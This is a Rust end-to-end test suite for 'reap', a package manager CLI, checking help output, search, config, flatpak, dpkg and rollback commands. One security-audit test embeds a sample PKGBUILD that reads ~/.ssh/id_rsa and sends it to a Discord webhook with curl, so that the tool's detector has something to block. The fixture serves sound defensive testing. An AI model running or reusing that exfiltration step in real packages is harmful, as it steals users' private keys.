//! End-to-End CLI Tests
//!
//! These tests verify the CLI interface works correctly by running the binary
//! and checking outputs. They don't actually install packages but test:
//! - Command parsing
//! - Search functionality
//! - Info retrieval
//! - Error handling
//!
//! Note: Some tests may behave differently based on system state (installed
//! AUR packages, network availability). Tests are written to handle both
//! success and graceful failure cases.

use std::process::Command;

/// Helper to run reap CLI and capture output
fn run_reap(args: &[&str]) -> (String, String, bool) {
    let output = Command::new(env!("CARGO_BIN_EXE_reap"))
        .args(args)
        .output()
        .expect("Failed to execute reap");

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let success = output.status.success();

    (stdout, stderr, success)
}

// =============================================================================
// Basic CLI Tests
// =============================================================================

#[test]
fn test_cli_version() {
    let (stdout, stderr, success) = run_reap(&["--version"]);
    assert!(
        success,
        "Version command should succeed. stderr: {}",
        stderr
    );
    assert!(
        stdout.contains(env!("CARGO_PKG_VERSION")),
        "Version output should contain {}, got: {}",
        env!("CARGO_PKG_VERSION"),
        stdout
    );
}

#[test]
fn test_cli_help() {
    let (stdout, stderr, success) = run_reap(&["--help"]);
    assert!(success, "Help command should succeed. stderr: {}", stderr);
    assert!(stdout.contains("Reaper"), "Help should mention Reaper");
    assert!(
        stdout.contains("install"),
        "Help should mention install command"
    );
    assert!(
        stdout.contains("search"),
        "Help should mention search command"
    );
    assert!(
        stdout.contains("remove"),
        "Help should mention remove command"
    );
}

#[test]
fn test_cli_invalid_command() {
    let (stdout, stderr, success) = run_reap(&["nonexistent-command"]);
    // Should fail with an error message
    assert!(
        !success || stderr.contains("error") || stderr.contains("unrecognized"),
        "Invalid command should fail or show error. stdout: {}, stderr: {}",
        stdout,
        stderr
    );
}

#[test]
fn test_cli_install_without_pkg() {
    let (stdout, stderr, success) = run_reap(&["install"]);
    // Should fail - missing required package argument
    assert!(
        !success,
        "Install without package should fail. stdout: {}, stderr: {}",
        stdout, stderr
    );
    // Error message should indicate missing argument
    let output = format!("{}{}", stdout, stderr);
    assert!(
        output.contains("required") || output.contains("argument") || output.contains("pkg"),
        "Error should mention missing argument. output: {}",
        output
    );
}

#[test]
fn test_cli_install_help_plan_flags() {
    let (stdout, stderr, success) = run_reap(&["install", "--help"]);
    assert!(success, "install --help should succeed. stderr: {}", stderr);
    assert!(
        stdout.contains("--dry-run"),
        "install help should mention --dry-run. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("--noconfirm"),
        "install help should mention --noconfirm. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("--skipreview"),
        "install help should mention --skipreview. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("--strict"),
        "install help should mention --strict. stdout: {}",
        stdout
    );
}

#[test]
fn test_cli_batch_install_help_plan_flags() {
    let (stdout, stderr, success) = run_reap(&["batch-install", "--help"]);
    assert!(
        success,
        "batch-install --help should succeed. stderr: {}",
        stderr
    );
    assert!(
        stdout.contains("--dry-run"),
        "batch-install help should mention --dry-run. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("--noconfirm"),
        "batch-install help should mention --noconfirm. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("--skipreview"),
        "batch-install help should mention --skipreview. stdout: {}",
        stdout
    );
}

// =============================================================================
// Config Tests
// =============================================================================

#[test]
fn test_cli_config_show() {
    let (stdout, stderr, success) = run_reap(&["config", "show"]);
    assert!(success, "Config show should succeed. stderr: {}", stderr);
    // Should display configuration structure
    assert!(
        stdout.contains("parallel")
            || stdout.contains("backend")
            || stdout.contains("Configuration"),
        "Config show should display config values. stdout: {}",
        stdout
    );
}

#[test]
fn test_cli_config_get() {
    let (stdout, stderr, success) = run_reap(&["config", "get", "parallel"]);
    assert!(
        success,
        "Config get parallel should succeed. stderr: {}",
        stderr
    );
    // Output should contain a numeric value (default is 2)
    assert!(
        stdout.contains('2') || stdout.contains('4') || stdout.contains('8'),
        "Config get parallel should return a number. stdout: {}",
        stdout
    );
}

// =============================================================================
// Profile Tests
// =============================================================================

#[test]
fn test_cli_profile_list() {
    let (stdout, stderr, success) = run_reap(&["profile", "list"]);
    assert!(success, "Profile list should succeed. stderr: {}", stderr);
    // Should show at least the default profile or "profiles" header
    let output = format!("{}{}", stdout, stderr);
    assert!(
        output.contains("profile") || output.contains("default") || output.contains("Profile"),
        "Profile list should show profiles. output: {}",
        output
    );
}

// =============================================================================
// Search Tests (Network-dependent)
// =============================================================================

#[test]
fn test_cli_search_aur() {
    let (stdout, stderr, success) = run_reap(&["search", "yay"]);
    let output = format!("{}{}", stdout, stderr);

    // Network-dependent: either finds results OR fails gracefully
    // Key: should not panic/crash - any structured output is acceptable
    if success {
        // Successful search should show package info or indicate searching
        assert!(
            output.contains("yay") || output.contains("AUR") || output.contains("Searching"),
            "Successful search should show results or status. output: {}",
            output
        );
    } else {
        // Graceful failure - as long as it didn't crash silently, it's acceptable
        // The CLI may show a status message without explicit "error" text
        assert!(
            !output.is_empty() || stderr.is_empty(),
            "Failed search should produce output or exit cleanly. output: {}",
            output
        );
    }
}

#[test]
fn test_cli_pacman_style_search() {
    let (stdout, stderr, success) = run_reap(&["-Ss", "neovim"]);
    let output = format!("{}{}", stdout, stderr);

    // Same logic as regular search - network dependent
    if success {
        assert!(
            output.contains("neovim")
                || output.contains("vim")
                || output.contains("results")
                || output.is_empty(),
            "Successful -Ss should show results or be empty. output: {}",
            output
        );
    } else {
        assert!(
            output.contains("error")
                || output.contains("Error")
                || output.contains("failed")
                || !output.is_empty(),
            "Failed -Ss should provide feedback. output: {}",
            output
        );
    }
}

// =============================================================================
// Pacman-style Flag Tests
// =============================================================================

#[test]
fn test_cli_pacman_style_query_upgradable() {
    let (stdout, stderr, success) = run_reap(&["-Qu"]);
    let output = format!("{}{}", stdout, stderr);

    // -Qu lists upgradable packages
    // Success with empty output = nothing to upgrade (valid)
    // Success with output = packages listed (valid)
    // Failure = no AUR packages installed or network issue (acceptable)
    if success {
        // Valid: either empty (nothing to upgrade) or contains package info or status
        assert!(
            output.is_empty()
                || output.contains("::")
                || output.contains("->")
                || output.contains("Checking"),
            "-Qu succeeded but output format unexpected: {}",
            output
        );
    } else {
        // Failure is acceptable - CLI should show status message or error
        // Key: didn't crash/panic, produced some output
        assert!(
            !output.is_empty() || stderr.is_empty(),
            "-Qu failed silently without any output"
        );
    }
}

#[test]
fn test_cli_pacman_syu_dry_run() {
    // Test that -Syu parses correctly by combining with --help
    // This avoids actually running a system upgrade
    let (stdout, stderr, success) = run_reap(&["--help"]);

    // --help should always succeed
    assert!(success, "--help should succeed. stderr: {}", stderr);

    // Verify -Syu is documented in help
    assert!(
        stdout.contains("-S") || stdout.contains("sync") || stdout.contains("Sync"),
        "Help should document sync flags. stdout: {}",
        stdout
    );
}

#[test]
fn test_cli_pacman_sc_clean() {
    let (stdout, stderr, success) = run_reap(&["-Sc"]);
    let output = format!("{}{}", stdout, stderr);

    // -Sc cleans cache
    if success {
        // Should indicate cleaning happened or cache was already clean
        assert!(
            output.contains("clean")
                || output.contains("Clean")
                || output.contains("cache")
                || output.is_empty(),
            "-Sc succeeded but didn't mention cleaning: {}",
            output
        );
    } else {
        // Failure should explain why
        assert!(
            !output.is_empty(),
            "-Sc failed silently without error message"
        );
    }
}

// =============================================================================
// AUR Command Tests (Network-dependent)
// =============================================================================

#[test]
fn test_cli_aur_fetch() {
    let (stdout, stderr, success) = run_reap(&["aur", "fetch", "yay"]);
    let output = format!("{}{}", stdout, stderr);

    if success {
        // Should show PKGBUILD content or fetch confirmation
        assert!(
            output.contains("PKGBUILD")
                || output.contains("pkgname")
                || output.contains("yay")
                || output.contains("fetch"),
            "aur fetch succeeded but no PKGBUILD shown: {}",
            output
        );
    } else {
        // Network failure should be reported
        assert!(
            output.contains("error")
                || output.contains("Error")
                || output.contains("not found")
                || output.contains("failed"),
            "aur fetch failed without error message: {}",
            output
        );
    }
}

#[test]
fn test_cli_aur_deps() {
    let (stdout, stderr, success) = run_reap(&["aur", "deps", "yay"]);
    let output = format!("{}{}", stdout, stderr);

    if success {
        // Should list dependencies
        assert!(
            output.contains("depend")
                || output.contains("Depend")
                || output.contains("go")
                || output.contains("git")
                || output.is_empty(),
            "aur deps succeeded but format unexpected: {}",
            output
        );
    } else {
        assert!(
            output.contains("error") || output.contains("Error") || output.contains("not found"),
            "aur deps failed without error message: {}",
            output
        );
    }
}

// =============================================================================
// Trust & Security Tests
// =============================================================================

#[test]
fn test_cli_trust_score() {
    let (stdout, stderr, success) = run_reap(&["trust", "score", "yay"]);
    let output = format!("{}{}", stdout, stderr);

    // Trust score requires network to fetch package info
    if success {
        assert!(
            output.contains("trust")
                || output.contains("Trust")
                || output.contains("Score")
                || output.contains("yay")
                || output.contains("/10"),
            "trust score succeeded but didn't show score: {}",
            output
        );
    } else {
        assert!(
            output.contains("error") || output.contains("Error") || output.contains("not found"),
            "trust score failed without error message: {}",
            output
        );
    }
}

#[test]
fn test_cli_security_stats() {
    let (stdout, stderr, success) = run_reap(&["security", "stats"]);
    let output = format!("{}{}", stdout, stderr);

    // Security stats should work offline
    assert!(
        success || output.contains("security") || output.contains("Security"),
        "security stats should succeed or show security info. success: {}, output: {}",
        success,
        output
    );
}

/// Write `contents` to a unique temp PKGBUILD, run `reap security audit` against
/// the file, and return the combined output. The temp file is always removed
/// before this returns, so callers can assert freely afterwards.
fn audit_local_pkgbuild(tag: &str, contents: &str) -> String {
    let path = std::env::temp_dir().join(format!(
        "reap-e2e-audit-{}-{}.PKGBUILD",
        std::process::id(),
        tag
    ));
    std::fs::write(&path, contents).expect("write temp PKGBUILD");
    let (stdout, stderr, _) = run_reap(&["security", "audit", path.to_str().unwrap()]);
    let _ = std::fs::remove_file(&path);
    format!("{}{}", stdout, stderr)
}

#[test]
fn test_cli_security_audit_local_infostealer_blocks() {
    // Sensitive credential read correlated with network exfiltration → the
    // engine should rate this high confidence and report a default block.
    let pkgbuild = r#"
pkgname=evil
build() {
  data=$(cat ~/.ssh/id_rsa)
  curl -X POST --data "$data" https://discord.com/api/webhooks/123/abc
}
"#;
    let output = audit_local_pkgbuild("stealer", pkgbuild).to_lowercase();
    assert!(
        output.contains("infostealer confidence: high"),
        "expected high infostealer confidence, got: {output}"
    );
    assert!(
        output.contains("blocked"),
        "expected a block notice, got: {output}"
    );
}

#[test]
fn test_cli_security_audit_local_does_not_leak_secret() {
    // The audit must never echo a secret it discovers back to the terminal.
    let secret = "AKIAIOSFODNN7EXAMPLE";
    let pkgbuild = format!("pkgname=leaky\naws_key={secret}\n");
    let output = audit_local_pkgbuild("secret", &pkgbuild);
    assert!(
        !output.contains(secret),
        "audit output leaked the credential value: {output}"
    );
    assert!(
        output.to_lowercase().contains("credential") || output.to_lowercase().contains("redacted"),
        "expected a redacted credential finding, got: {output}"
    );
}

#[test]
fn test_cli_security_audit_local_clean_pkgbuild() {
    let pkgbuild = r#"
pkgname=hello
pkgver=1.0
source=("https://example.org/hello-1.0.tar.gz")
sha256sums=('SKIP')
build() { make; }
package() { make DESTDIR="$pkgdir" install; }
"#;
    let output = audit_local_pkgbuild("clean", pkgbuild).to_lowercase();
    assert!(
        output.contains("infostealer confidence: none"),
        "clean PKGBUILD should have no infostealer signal, got: {output}"
    );
    assert!(
        !output.contains("blocked"),
        "clean PKGBUILD should not be blocked, got: {output}"
    );
}

// =============================================================================
// System Commands
// =============================================================================

#[test]
fn test_cli_doctor() {
    let (stdout, stderr, success) = run_reap(&["doctor"]);
    let output = format!("{}{}", stdout, stderr);

    // Doctor runs system diagnostics - should always produce output
    assert!(
        !output.is_empty(),
        "doctor should produce diagnostic output"
    );

    if success {
        assert!(
            output.contains("Doctor")
                || output.contains("check")
                || output.contains("✓")
                || output.contains("✗")
                || output.contains("diagnostic"),
            "doctor succeeded but didn't show diagnostics: {}",
            output
        );
    }
}

#[test]
fn test_cli_orphan_list() {
    let (stdout, stderr, success) = run_reap(&["orphan"]);
    let output = format!("{}{}", stdout, stderr);

    // Orphan list should succeed (may be empty if no orphans)
    assert!(success, "orphan command should succeed. stderr: {}", stderr);

    // Output is valid whether empty (no orphans) or lists packages
    // The command succeeded, so any output format is acceptable
    // This assertion is mainly documenting expected patterns
    if !output.is_empty() {
        assert!(
            output.contains("orphan")
                || output.contains("Orphan")
                || output.contains("No ")
                || output.lines().count() > 0,
            "orphan output format unexpected: {}",
            output
        );
    }
}

#[test]
fn test_cli_tap_list() {
    let (stdout, stderr, success) = run_reap(&["tap", "list"]);
    let output = format!("{}{}", stdout, stderr);

    // Tap list should succeed (may be empty if no taps configured)
    assert!(success, "tap list should succeed. stderr: {}", stderr);

    // Valid if empty (no taps) or shows tap info
    assert!(
        output.is_empty()
            || output.contains("tap")
            || output.contains("Tap")
            || output.contains("No "),
        "tap list output format unexpected: {}",
        output
    );
}

// =============================================================================
// Flatpak Command Tests
// =============================================================================

#[test]
fn test_cli_flatpak_help() {
    let (stdout, stderr, success) = run_reap(&["flatpak", "--help"]);
    assert!(success, "flatpak --help should succeed. stderr: {}", stderr);
    // Help should mention subcommands
    assert!(
        stdout.contains("search") || stdout.contains("Search"),
        "flatpak help should mention search. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("install") || stdout.contains("Install"),
        "flatpak help should mention install. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("list") || stdout.contains("List"),
        "flatpak help should mention list. stdout: {}",
        stdout
    );
}

#[test]
fn test_cli_flatpak_list() {
    let (stdout, stderr, success) = run_reap(&["flatpak", "list"]);
    let output = format!("{}{}", stdout, stderr);

    // If flatpak is not installed, should fail gracefully
    if output.contains("not installed") {
        assert!(!success, "Should fail when flatpak not installed");
        return;
    }

    // If flatpak is installed, command should succeed
    if success {
        // Valid: either shows apps or says "No Flatpak applications"
        assert!(
            output.contains("Application")
                || output.contains("No Flatpak")
                || output.contains("Total:")
                || output.is_empty(),
            "flatpak list output unexpected: {}",
            output
        );
    }
}

#[test]
fn test_cli_flatpak_remotes() {
    let (stdout, stderr, success) = run_reap(&["flatpak", "remotes"]);
    let output = format!("{}{}", stdout, stderr);

    // If flatpak is not installed, should fail gracefully
    if output.contains("not installed") {
        return;
    }

    if success {
        // Should show configured remotes or say none
        assert!(
            output.contains("Name") || output.contains("flathub") || output.contains("No remotes"),
            "flatpak remotes output unexpected: {}",
            output
        );
    }
}

#[test]
fn test_cli_flatpak_check_updates() {
    let (stdout, stderr, success) = run_reap(&["flatpak", "check-updates"]);
    let output = format!("{}{}", stdout, stderr);

    // If flatpak is not installed, should fail gracefully
    if output.contains("not installed") {
        return;
    }

    if success {
        // Should indicate updates available or all up to date
        assert!(
            output.contains("update") || output.contains("Update") || output.contains("up to date"),
            "flatpak check-updates output unexpected: {}",
            output
        );
    }
}

#[test]
fn test_cli_flatpak_search() {
    let (stdout, stderr, success) = run_reap(&["flatpak", "search", "firefox"]);
    let output = format!("{}{}", stdout, stderr);

    // If flatpak is not installed, should fail gracefully
    if output.contains("not installed") {
        return;
    }

    // Network-dependent test
    if success {
        // Should find Firefox or similar results
        assert!(
            output.contains("firefox")
                || output.contains("Firefox")
                || output.contains("mozilla")
                || output.contains("No results"),
            "flatpak search firefox output unexpected: {}",
            output
        );
    }
}

#[test]
fn test_cli_flatpak_upgrade_command() {
    // Just test that the upgrade command is recognized
    let (stdout, stderr, _success) = run_reap(&["flatpak-upgrade"]);
    let output = format!("{}{}", stdout, stderr);

    // Should either work or say flatpak not installed - not "command not found"
    assert!(
        !output.contains("unrecognized") && !output.contains("not a reap command"),
        "flatpak-upgrade should be a recognized command. output: {}",
        output
    );
}

// =============================================================================
// dpkg Command Tests (.deb local handling)
// =============================================================================

#[test]
fn test_cli_dpkg_help() {
    let (stdout, stderr, success) = run_reap(&["dpkg", "--help"]);
    assert!(success, "dpkg --help should succeed. stderr: {}", stderr);
    // Help should mention subcommands
    assert!(
        stdout.contains("info") || stdout.contains("Info"),
        "dpkg help should mention info. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("install") || stdout.contains("Install"),
        "dpkg help should mention install. stdout: {}",
        stdout
    );
}

#[test]
fn test_cli_dpkg_info_missing_file() {
    let (stdout, stderr, success) = run_reap(&["dpkg", "info", "nonexistent.deb"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail with clear error message
    assert!(
        !success,
        "dpkg info on missing file should fail. output: {}",
        output
    );
    assert!(
        output.contains("not found") || output.contains("Not found") || output.contains("Error"),
        "Should indicate file not found. output: {}",
        output
    );
}

#[test]
fn test_cli_dpkg_info_wrong_extension() {
    let (stdout, stderr, success) = run_reap(&["dpkg", "info", "/tmp/test.txt"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail - wrong extension (or file not found, either is acceptable)
    assert!(
        !success
            || output.contains("not a .deb")
            || output.contains("Not a .deb")
            || output.contains("not found"),
        "dpkg info on non-deb should fail or warn. output: {}",
        output
    );
}

#[test]
fn test_cli_dpkg_install_missing_file() {
    let (stdout, stderr, success) = run_reap(&["dpkg", "install", "nonexistent.deb"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail with clear error message
    assert!(
        !success,
        "dpkg install on missing file should fail. output: {}",
        output
    );
    assert!(
        output.contains("not found") || output.contains("Not found") || output.contains("Error"),
        "Should indicate file not found. output: {}",
        output
    );
}

// =============================================================================
// Rollback Command Tests
// =============================================================================

#[test]
fn test_cli_rollback_list() {
    let (stdout, stderr, success) = run_reap(&["rollback", "list"]);
    let output = format!("{}{}", stdout, stderr);

    // List should succeed even when empty
    assert!(success, "rollback list should succeed. output: {}", output);
    assert!(
        output.contains("transaction") || output.contains("Transaction") || output.contains("No "),
        "rollback list should show transactions or empty message. output: {}",
        output
    );
}

#[test]
fn test_cli_rollback_show_missing_txid() {
    let (stdout, stderr, success) = run_reap(&["rollback", "show", "tx_nonexistent_12345"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail with non-zero exit code for missing transaction
    assert!(
        !success,
        "rollback show with missing txid should fail with non-zero exit. output: {}",
        output
    );
    assert!(
        output.contains("not found")
            || output.contains("Not found")
            || output.contains("Transaction"),
        "Should indicate transaction not found. output: {}",
        output
    );
}

#[test]
fn test_cli_rollback_dry_run_missing_txid() {
    let (stdout, stderr, success) = run_reap(&["rollback", "dry-run", "tx_nonexistent_12345"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail with non-zero exit code for missing transaction
    assert!(
        !success,
        "rollback dry-run with missing txid should fail with non-zero exit. output: {}",
        output
    );
    assert!(
        output.contains("not found")
            || output.contains("Not found")
            || output.contains("Transaction"),
        "Should indicate transaction not found. output: {}",
        output
    );
}

#[test]
fn test_cli_rollback_apply_missing_txid() {
    let (stdout, stderr, success) = run_reap(&["rollback", "apply", "tx_nonexistent_12345"]);
    let output = format!("{}{}", stdout, stderr);

    // Should fail with non-zero exit code for missing transaction
    assert!(
        !success,
        "rollback apply with missing txid should fail with non-zero exit. output: {}",
        output
    );
    assert!(
        output.contains("not found")
            || output.contains("Not found")
            || output.contains("Transaction"),
        "Should indicate transaction not found. output: {}",
        output
    );
}

#[test]
fn test_cli_rollback_help() {
    let (stdout, stderr, success) = run_reap(&["rollback", "--help"]);
    assert!(
        success,
        "rollback --help should succeed. stderr: {}",
        stderr
    );
    // Help should mention subcommands
    assert!(
        stdout.contains("list") || stdout.contains("List"),
        "rollback help should mention list. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("show") || stdout.contains("Show"),
        "rollback help should mention show. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("dry-run") || stdout.contains("Dry"),
        "rollback help should mention dry-run. stdout: {}",
        stdout
    );
    assert!(
        stdout.contains("apply") || stdout.contains("Apply"),
        "rollback help should mention apply. stdout: {}",
        stdout
    );
}

// =============================================================================
// Exit-code propagation (P0.11)
// =============================================================================

#[test]
fn test_cli_local_install_missing_file_exits_nonzero() {
    // `reap local` on a missing artifact must fail *before* any pacman/sudo
    // call (the file-existence check), so this is safe to run anywhere and
    // deterministically exercises failure propagation to the process exit code.
    let missing = format!(
        "{}/reap-nonexistent-{}.pkg.tar.zst",
        std::env::temp_dir().display(),
        std::process::id()
    );
    let (stdout, stderr, success) = run_reap(&["local", &missing]);
    assert!(
        !success,
        "local install of a missing file must exit nonzero. stdout: {}, stderr: {}",
        stdout, stderr
    );
    assert!(
        stderr.contains("does not exist"),
        "should report the missing file. stderr: {}",
        stderr
    );
}
